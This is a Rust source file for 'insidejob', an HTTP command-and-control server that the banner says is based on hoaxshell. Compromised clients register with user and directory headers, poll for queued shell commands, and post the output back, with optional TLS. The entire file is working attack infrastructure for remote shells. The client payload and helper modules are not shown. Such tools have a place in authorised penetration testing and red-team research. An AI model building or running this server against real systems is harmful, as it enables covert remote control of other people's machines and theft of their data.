mod session;
mod storage;

use std::borrow::Cow;
use std::collections::HashMap;
use std::string::FromUtf8Error;
use std::sync::{LockResult, RwLock, RwLockReadGuard, RwLockWriteGuard};
use clap::Parser;
use log::{error, info, trace, warn};
use crate::session::{Command, Session};
use crate::storage::SessionStore;

static LOGO: &'static str = "
            ┌───┐
──┬── ┬┐  ┬ │   │ ──┬── ┬──┐  ┬───┐           ┬ ┌───┐ ┬──┐
  │   │└┐ │ │   ┴   │   │  └┐ │               │ │   │ │  │
  │   │ │ │ └───┐   │   │   │ ┼──┼   ───      │ │   │ ┼──┴┐
  │   │ └┐│ ┬   │   │   │  ┌┘ │           ┬   │ │   │ │   │
──┴── ┴  └┴ │   │ ──┴── ┴──┘  ┴───┘       └───┘ └───┘ ┴───┘
            └───┘                           made by cauvmou
                                         based on hoaxshell

";

#[derive(clap::Parser, Debug)]
#[command(version, about, long_about = None)]
struct Args {
    #[arg(short, long, default_value = "0.0.0.0")]
    address: std::net::Ipv4Addr,
    #[arg(short, long, default_value_t = 4132)]
    port: u16,
    #[arg(
        short,
        long,
        value_name = "FILE",
        requires = "cert",
        help = "TLS key for HTTPS, must be PEM format."
    )]
    key: Option<std::path::PathBuf>,
    #[arg(
        short,
        long,
        value_name = "FILE",
        requires = "key",
        help = "TLS cert for HTTPS, must be PEM format."
    )]
    cert: Option<std::path::PathBuf>,
}

#[actix_web::get("/")]
async fn index(req: actix_web::HttpRequest, session_store: actix_web::web::Data<RwLock<SessionStore>>) -> impl actix_web::Responder {
    if let (Some(header_user), Some(header_dir)) = (req.headers().get("x-User"), req.headers().get("x-Dir")) {
        if let (Ok(user), Ok(directory)) = (header_user.to_str().map(String::from), header_dir.to_str().map(String::from)) {
            let uuid = uuid::Uuid::new_v4();
            return match session_store.write() {
                Ok(mut store) => {
                    info!("new client ({uuid}) with user: {user}");
                    store.create_session(Session {
                        uuid: uuid.as_u128(),
                        last_seen: std::time::SystemTime::now(),
                        status: session::Status::Active,
                        metadata: session::SessionData {
                            user,
                            directory,
                        },
                    });
                    actix_web::HttpResponse::Ok().body(uuid.to_string())
                }
                Err(_) => {
                    actix_web::HttpResponse::InternalServerError().body("Failed to acquire session store lock!".to_string())
                }
            }
        }
    }
    actix_web::HttpResponse::BadRequest().finish()
}

#[actix_web::get("/{uuid}")]
async fn cmd_input(path: actix_web::web::Path<(String,)>, req: actix_web::HttpRequest, session_store: actix_web::web::Data<RwLock<SessionStore>>) -> impl actix_web::Responder {
    if let (Some(header_user), Some(header_dir)) = (req.headers().get("x-User"), req.headers().get("x-Dir")) {
        if let (Ok(_), Ok(_)) = (header_user.to_str().map(String::from), header_dir.to_str().map(String::from)) {
            let Ok(uuid) = uuid::Uuid::parse_str(path.0.as_str()) else {
                warn!("cannot parse uuid: {}", path.0.as_str());
                return actix_web::HttpResponse::BadRequest().finish();
            };
            let Ok(store) = session_store.read() else {
                return actix_web::HttpResponse::InternalServerError().body("Failed to acquire session store lock!".to_string())
            };
            return match store.get_pending_command(uuid.as_u128()) {
                Ok(command) => actix_web::HttpResponse::Ok().body(command),
                Err(err) => actix_web::HttpResponse::InternalServerError().body(err),
            }
        }
    }
    actix_web::HttpResponse::BadRequest().finish()
}

#[actix_web::post("/{uuid}")]
async fn cmd_output(path: actix_web::web::Path<(String,), >, bytes: actix_web::web::Bytes, req: actix_web::HttpRequest, session_store: actix_web::web::Data<RwLock<SessionStore>>) -> impl actix_web::Responder {
    if let (Some(header_user), Some(header_dir)) = (req.headers().get("x-User"), req.headers().get("x-Dir")) {
        if let (Ok(user), Ok(directory)) = (header_user.to_str().map(String::from), header_dir.to_str().map(String::from)) {
            let Ok(uuid) = uuid::Uuid::parse_str(path.0.as_str()) else {
                warn!("cannot parse uuid: {}", path.0.as_str());
                return actix_web::HttpResponse::BadRequest().finish();
            };
            let output = match String::from_utf8(bytes.to_vec()) {
                Ok(string) => string,
                Err(err) => {
                    error!("failed to convert bytes to string: {err}");
                    return actix_web::HttpResponse::BadRequest().finish();
                }
            };
            let Ok(store) = session_store.read() else {
                return actix_web::HttpResponse::InternalServerError().body("Failed to acquire session store lock!".to_string())
            };
            let command = match store.resolve_command(uuid.as_u128(), output) {
                Ok(command) => command,
                Err(err) => return actix_web::HttpResponse::InternalServerError().body(format!("{err}").to_string())
            };
            return match store.insert_command(uuid.as_u128(), command) {
                Ok(_) => actix_web::HttpResponse::Ok().finish(),
                Err(err) => actix_web::HttpResponse::InternalServerError().body(format!("{err}").to_string())
            };
        }
    }
    actix_web::HttpResponse::BadRequest().finish()
}

#[actix_web::main]
async fn main() -> std::io::Result<()> {
    let args = Args::parse();
    simple_logger::SimpleLogger::new()
        .with_level(log::LevelFilter::Warn)
        .with_module_level("insidejob", log::LevelFilter::Info)
        .init().expect("Failed to start logger!");
    println!("{LOGO}");

    let mut server = actix_web::HttpServer::new(|| {
        actix_web::App::new()
            .app_data(actix_web::web::Data::new(RwLock::new(SessionStore::default())))
            .service(index)
            .service(cmd_input)
            .service(cmd_output)
    });

    let server_binding = if let (Some(key), Some(cert)) = (args.key, args.cert) {
        info!("using TLS key from {key:?}, and cert from {cert:?}...");
        let mut builder = openssl::ssl::SslAcceptor::mozilla_intermediate(openssl::ssl::SslMethod::tls()).unwrap();
        builder.set_private_key_file(key, openssl::ssl::SslFiletype::PEM).unwrap();
        builder.set_certificate_chain_file(cert)?;
        server.bind_openssl((args.address, args.port), builder)
    } else {
        info!("no TLS key/cert specified, starting in HTTP only mode!");
        server.bind((args.address, args.port))
    };

    match server_binding {
        Ok(server) => {
            server.addrs_with_scheme().iter().for_each(|(addr, scheme)| info!("listening on: {scheme}://{addr}"));
            server.run().await?;
        }
        Err(err) => {
            error!("{err}");
        }
    }
    Ok(())
}